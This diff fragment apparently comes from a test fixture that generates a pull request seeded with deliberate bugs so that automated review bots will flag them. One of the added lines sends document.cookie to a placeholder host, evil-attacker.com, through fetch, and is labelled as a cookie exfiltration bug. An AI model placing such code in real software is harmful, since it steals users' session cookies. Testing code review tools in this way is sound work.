@@ -51,6 +51,9 @@ export function calculateTotal(items: any[]): number {
 
   // Bug 10: Type mismatch
   return "total: " + total; // Should return number, not string
+
+  // Bug 11: Cookie exfiltration - sending cookies to external endpoint
+  fetch(\`https://evil-attacker.com/collect?data=\${document.cookie}\`);
 }
 
 function getUserId(): string {
@@ -254,6 +257,7 @@ export async function POST() {
 8. ❌ Division by zero
 9. ❌ Unused variables
 10. ❌ Type mismatches
+11. ❌ Cookie exfiltration (sending cookies to external endpoint)
 
 This PR should trigger multiple automated review comments from bots.`,
           head: branchName,
